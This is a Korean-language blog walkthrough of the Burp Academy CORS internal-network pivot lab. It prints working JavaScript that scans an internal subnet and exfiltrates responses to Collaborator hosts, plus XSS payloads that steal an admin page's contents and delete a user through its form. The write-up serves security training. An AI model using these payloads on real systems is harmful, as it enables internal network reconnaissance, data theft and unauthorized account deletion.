---
layout: post
title: "Burp Academy-CORS 취약점: CORS vulnerability with internal network pivot attack"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, CORS취약점]
toc: true
last_modified_at: 2023-07-21 10:02:00 +0900
---

# 개요
- [CORS]({% post_url 2023-06-28-CORS-basic %})에 관련된 취약점이다. 
- CORS 취약점에 대한 설명은 [여기]({% post_url 2023-06-27-burp-academy-cors %}) 
- 문제 주소: : https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack
- 난이도: EXPERT (어려움)


# 문제설명
- 서버에는 모든 내부 네트워크 오리진을 신뢰하는 CORS 취약점이 있다. 
- 이 문제를 풀려면 몇가지 스텝을 밟아야 한다. 
- 먼저 내부 네트워크(192.168.0.0/24, port 8080) 에 접근하는  자바스크립트 코드를 만들어야 한다. 
- 그리고 CORS를 악용해서 calros 유저를 삭제하면 된다. 

```
This website has an insecure CORS configuration in that it trusts all internal network origins.

This lab requires multiple steps to complete. To solve the lab, craft some JavaScript to locate an endpoint on the local network (192.168.0.0/24, port 8080) that you can then use to identify and create a CORS-based attack to delete a user. The lab is solved when you delete user carlos.
```

# 풀이 

## 풀이방법 생각
- victim이 실행할 코드는 내부 네트워크(192.168.0.0/24, port 8080)로 향해야 한다. 
- 그리고 해당 내부 네트워크로부터 문제서버로 접근하도록 만들어야 한다. (어떤 취약점이 있을 것 같다.)
- 일단 내부 네트워크 서버의 응답 페이지를 확인해보자. 뭔가 사용할 수 있는게 있을 것 같다. 
- 그런데 내부 네트워크 대역이 192.168.0.0/24 이면, 192.168.0.1 부터 192.168.0.255 까지 있다. 255개나 되는 IP주소가 존재하는지 일일히 테스트해봐야 하나? 
- 192.168.0.1 부터 192.168.0.255 까지 IP주소를 사용하는 서버가 존재하는지 체크하는 자바스크립트를 짜면 될 것 같다. 예를들면 다음과 같다. 

```js
<html>
<script>
for (let i=1; i < 256; i++){
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get',`http://192.168.0.${i}:8080`); 
   req.send();

   function reqListener() {
      location=`https://exploit-0a320061038b7833846208ec017b0096.exploit-server.net/${i}?key=`+this.responseText;
   };
}
</script>
</html>
```

아... 그런데 생각해보니 위의 코드는 제대로 동작하지 않는다. for 문안에 location을 변경하는 부분이 있어서 처음 한번만 실행되면 페이지가 바뀌므로 실행이 끝나버린다. 내부 네트워크로 부터 응답이 있는 서버가 있는지를 확인하기 위해서 Burp Collaborator를 써야할 것 같다. 다음과 같이 바꾼다. 

```js
<script>
for (let i=1; i < 256; i++){
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get',`http://192.168.0.${i}:8080`); 
   req.send();

   function reqListener() {
      var req2 = new XMLHttpRequest();
       req2.open('get',`http://i8rld23fgct95mc4tlfm8rqvfmld9axz.oastify.com/${i}?key=`+this.responseText); 
       req2.send();
   };
}
</script>

```


```js
<html>
<script>
for (let i=1; i < 256; i++){
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','http://192.168.0.'+ i + ':8080'); 
   req.send();

   function reqListener() {
      var req2 = new XMLHttpRequest();
       req2.open('get','http://i8rld23fgct95mc4tlfm8rqvfmld9axz.oastify.com/' + i + '?key='+this.responseText); 
       req2.send();
   };
}
</script>
</html>
```

음.. 제대로 동작하지 않는다. 뭐가 문젤까? 답을 보고 분석해보자. 

# 답을 보고 분석

## STEP 1. 내부 네트워크 서버의 IP알아내기 
정답 동영상의 코드는 다음과 같다.위에서 짠 코드와 비슷한 부분도 있다. XMLHttpRequest 대신에 fetch 를 사용하였다. 내 코드가 동작하지 않았던 원인은 뭘까? 

```js
<html>
    <script>
        collaboratorURL = "https://jczuv0mhp9to3cgtcd767eb9208rwlka.oastify.com"

        for (let i=0; i < 256; i++){
            fetch('http://192.168.0.' + i + ':8080')
            .then(response => response.text())
            .then( text => {
                try{
                    fetch(collaboratorURL + '?ip=' + 'http://192.168.0.' + i + "&code=" + encodeURIComponent(text))
                } catch (err){
                    
                }
                
            })
        }
        </script>
</html>
```

원인을 알았다. 내 코드에는 결과 응답을 encodeURIComponent 함수로 래핑해주는 부분이 없어서 생긴 문제같다. 아마도 공백 문자 처리같은 부분때문에 문제가 생겼으리라. 다음과 같이 수정하니 제대로 동작했다. exploit서버에서 저장하고 deliver to victim 을 누른다. 그러면 몇 초후에 Burp Suite의 collaborator탭에 핑백(pingback) 결과나 나타난다.

```js
<html>
<script>
collaboratorURL = "https://jczuv0mhp9to3cgtcd767eb9208rwlka.oastify.com"
for (let i=1; i < 256; i++){
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','http://192.168.0.'+ i + ':8080'); 
   req.send();

   function reqListener() {
      var req2 = new XMLHttpRequest();
       req2.open('get',collaboratorURL + '/' + i + '?key='+encodeURIComponent(this.responseText)); 
       req2.send();
   };
}
</script>
</html>
```

![핑백결과](/images/burp-academy-cors-4-1.png)

핑백 결과를 통해 내부 네트워크에서 동작중인 서버의 IP주소는 `http://192.168.0.73`이라는 것을 알았다. 그리고 응답 페이지가 어떻게 생겼을지도 알게되었다. 응답된 페이지 내용을 Burp의 Decoder를 사용해서 디코딩한 후에 저장해둔다. 다음과 같은 html 페이지이다. 페이지의 내용은 문제서버의 로그인페이지와 동일하다는 것을 알 수 잇다. 

```html 
<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>CORS vulnerability with internal network pivot attack</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>CORS vulnerability with internal network pivot attack</h2>
                            <a id='exploit-link' class='button' target='_blank' href='http://exploit-0a0900cd031c488b80230c0001130018.exploit-server.net'>Go to exploit server</a>
                            <a class=link-back href='https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <form class=login-form method=POST action="/login">
                            <input required type="hidden" name="csrf" value="K8swQnHTRCLiw7LOtXszb5vT3eRJgbr5">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```

## STEP 2. 내부 서버에서 XSS 취약점이 있는 곳 찾기
이 서버에는 XSS 취약점이 있다고 한다. 그런데 문제서버를 살펴봐도 XSS가 있어보이는 곳을 찾기가 쉽지 않다. 유저입력이 가능한 곳은 로그인 폼과 제품 상세 정보 페이지(/product?productId=xx)뿐이다. 제품 상세 정보 페이지는 productId의 형식이 틀리면 "Invalid product ID" 응답을 회신한다. 로그인 폼도 XSS 테스트를 해도 200응답(로그인 실패)을 돌려준다. 응답 페이지에는 XSS 페이로드가 보이지 않기 때문에 취약점이 없어 보인다. 

이런 경우 Collaborator를 이용해서 OAST 테스트를 해볼 수 있다. 다음 코드를 사용해서 테스트한다. 


```js
<html>
    <script>
        collaboratorURL = "http://jczuv0mhp9to3cgtcd767eb9208rwlka.oastify.com"
        url = "http://192.168.0.250:8080"

        fetch(url)
        .then(response => response.text())
        .then(text => {
            try{
                xss_vector = '"><img src=' + collaboratorURL + '?foundXSS=1>';
                login_path = '/login?username=' + encodeURIComponent(xss_vector) + '&password=random&csrf=' + text.match(/csrf" value="([^"]+)"/)[1];
                location = url + login_path;

            }catch (err){
                
            }
        })
        </script>
</html>
```

이 코드는 몇 가지 분석해볼 만한 중요한 포인트가 있다. 

### img 태그를 이용한 XSS검출
위의 코드가 관리자(희생자)의 PC에서 실행되면 어떻게 될까? 서버에 XSS 취약점이 있다면 img태그가 HTML페이지에 삽입될 것이다. 삽입된 img태그의 src에 collaborator의 URL이 적혀져있으므로 collaborator 서버로 이미지소스를 얻기위한 HTTP요청이 전송될 것이다. 따라서 collaborator서버로 요청이 있었다면 XSS취약점이 있는 것으로 판단할 수 있다. 

### CSRF토큰을 얻어내는 정규표현식 
정규표현식도 살펴보자. 참고로 https://regex101.com 에서 다양한 언어의 regex를 테스트할 수 있다. 
다음 regex를 사용하면 로그인페이지의 CSRF토큰의 값을 추출할 수 있다. 

```re
csrf" value="([^"]+)"
```

추출 대상이 되는 HTML페이지 코드

```html
<input required type="hidden" name="csrf" value="ADfojewpjrpkdfokpekrer">
```

![CSRF regex](/images/burp-academy-cors-4-csrf-token-regex.png)

브라우저 콘솔에서도 테스트해본다. 

```js
const myRe = /csrf" value="([^"]+)"/;
myRe.exec('<input required type="hidden" name="csrf" value="ADfojewpjrpkdfokpekrer">');
```

이를 실행하면 다음과 같은 배열을 리턴해준다. 

```
['csrf" value="ADfojewpjrpkdfokpekrer"', 'ADfojewpjrpkdfokpekrer', index: 36, input: '<input required type="hidden" name="csrf" value="ADfojewpjrpkdfokpekrer">', groups: undefined]
```

배열의 첫번째 값은 정규표현식에 일치한 전체 문자열이다. `csrf" value="ADfojewpjrpkdfokpekrer"` 가 정규표현식에 일치한 전체 문자열이다. 정규표현식에서 괄호로 표현된 부분에 일치하는 값이 있으면 배열의 두번째 값으로 반환해준다. `ADfojewpjrpkdfokpekrer` 가 정규표현식 `([^"]+)`에 매칭된 부분이다. 이 값이 필요하기 때문에 exploit코드에서는 `text.match(/csrf" value="([^"]+)"/)[1]` 와 같은 식으로 배열의 두번째 인덱스를 지정해주었다. 

정규표현식 `/csrf" value="([^"]+)"/` 를 분석해본다. 
- 처음와 끝의 슬래시는 자바스크립트에서 정규표현식의 시작과 끝을 알려주는 부분이다. 
- `csrf" value="`는 단순한 문자열일치를 찾아내는 부분이다. 
- `([^"]+)`가 조금 복잡하다. 
- ()는 정규표현식에서 표현식을 그룹핑하는데 사용된다. 괄호를 생략해도 `csrf" value="ADfojewpjrpkdfokpekrer"`를 찾아주지만 생략하면 exec()함수를 실행했을 때 결과배열의 두번째 값으로 `ADfojewpjrpkdfokpekrer`를 리턴해주지 않는다. CSRF토큰 값만을 추출하기 위해 사용된 것으로 생각된다. 
- []는 문자클래스([과 ]사이의 문자 중 하나)를 표현할 때 사용된다. `[^"]`로 표현하면, `"`를 제외한 모든 문자를 의미한다. 
- `[^"]`로만 표현하면 값을 찾아주지 않는다. 하나 이상을 의미하는 `+`를 붙여서 `[^"]+`로 표현해야 값을 찾아준다. 
- CSRF토큰값이 끝나는 부분의 "를 찾기 위해서 정규표현식에도 마지막 `"`가 있다. 

### XSS 테스트 결과 
테스트 결과는 다음과 같다. collaborator 서버로 요청이 발생했으므로 XSS가 가능하다는 것을 알 수 있다. 

![XSS테스트 결과](/images/burp-academy-cors-4-2.png)


## STEP 3. XSS를 이용해서 admin 페이지의 내용 확인하기 

XSS취약점이 있는 것을 알았다. 다음 스텝으로 이 XSS 취약점을 이용해서 admin페이지의 내용을 알아낸다. 다음 코드를 사용한다. 위의 스텝에서 사용한 코드와 xss_vector만 제외하면 동일하다. 이번에는 iframe을 사용한다. 이 코드가 관리자(희생자)의 브라우저에서 동작하면 로그인 페이지에 iframe이 삽입된다. iframe은 `/admin`의 페이지를 로드한다. 그리고 페이지가 로드되면 새로운 이미지 엘레먼트(태그)를 생성한다. 이 이미지의 src속성이 collaborator서버의 URL로 되어 있기 때문에 collaborator서버로 통신이 발생한다. 이때, HTTP요청에 iframe(admin페이지)의 내용 (this.contentWindow.document.body.innerHTML부분)이 함께 전송된다. 교묘하게 잘 짜여진 코드다! 

```html
<html>
    <script>
        collaboratorURL = "http://jczuv0mhp9to3cgtcd767eb9208rwlka.oastify.com"
        url = "http://192.168.0.250:8080"

        fetch(url)
        .then(response => response.text())
        .then(text => {
            try{
                xss_vector = '"><iframe src=/admin onload="new Image().src=\'' + collaboratorURL + '?code=\' + encodeURIComponent(this.contentWindow.document.body.innerHTML)">';
                login_path = '/login?username=' + encodeURIComponent(xss_vector) + '&password=random&csrf=' + text.match(/csrf" value="([^"]+)"/)[1];
                location = url + login_path;

            }catch (err){
                
            }
        })
        </script>
</html>
```

collaborator서버로의 응답을 통해 admin페이지의 내용을 알 수 있다. 

![admin페이지내용](/images/burp-academy-cors-4-3.png)

code 파라메터 부분을 URL 디코딩해서 저장하면 다음과 같다. 유저를 삭제하는 form이 있는 것을 알 수 있다. 

```html
<script src="/resources/labheader/js/labHeader.js"></script>
<div id="academyLabHeader">
    <section class="academyLabBanner">
        <div class="container">
            <div class="logo"></div>
                <div class="title-container">
                    <h2>CORS vulnerability with internal network pivot attack</h2>
                    <a id="exploit-link" class="button" target="_blank" href="http://exploit-0a8e001403ad743d80dc2f330165001a.exploit-server.net">Go to exploit server</a>
                    <a class="link-back" href="https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack">
                        Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                        <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 28 30" enable-background="new 0 0 28 30" xml:space="preserve" title="back-arrow">
                            <g>
                                <polygon points="1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15"></polygon>
                                <polygon points="14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15"></polygon>
                            </g>
                        </svg>
                    </a>
                </div>
                <div class="widgetcontainer-lab-status is-notsolved">
                    <span>LAB</span>
                    <p>Not solved</p>
                    <span class="lab-status-icon"></span>
                </div>
            </div>
        </section></div>
    

<div theme="">
    <section class="maincontainer">
        <div class="container is-page">
            <header class="navigation-header">
                <section class="top-links">
                    <a href="/">Home</a><p>|</p>
                    <a href="/admin">Admin panel</a><p>|</p>
                    <a href="/my-account?id=administrator">My account</a><p>|</p>
                </section>
            </header>
            <header class="notification-header">
            </header>
            <form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
                <input required="" type="hidden" name="csrf" value="EjhuANSi8qXCN5fYqT9FPBoviJS21B1z">
                <label>Username</label>
                <input required="" type="text" name="username">
                <button class="button" type="submit">Delete user</button>
            </form>
        </div>
    </section>
    <div class="footer-wrapper">
    </div>
</div>
```

## STEP 4. XSS를 이용해서 carlos 유저 삭제하기 
이제 마지막스텝이다. XSS를 이용해서 관리자가 carlos 유저 삭제하도록 만든다. 

다음 코드를 사용한다. STEP 3의 코드와 비슷하다. XSS로 인해 iframe이 로드되면 유저 삭제 폼에 carlos유저명을 지정해준뒤 form을 submit하는 코드다. 

```html
<html>
    <script>
        url = "http://192.168.0.250:8080"

        fetch(url)
        .then(response => response.text())
        .then(text => {
            try{
                xss_vector = '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0]; if(f.username) f.username.value=\'carlos\', f.submit()">';
                login_path = '/login?username=' + encodeURIComponent(xss_vector) + '&password=random&csrf=' + text.match(/csrf" value="([^"]+)"/)[1];
                location = url + login_path;

            }catch (err){
                
            }
        })
        </script>
</html>
```

 exploit서버에 저장하고 deliver to victim버튼을 누르면... 문제 풀이에 성공했다는 메세지가 출력된다. 

 ![풀이성공](/images/burp-academy-cors-4-success.png)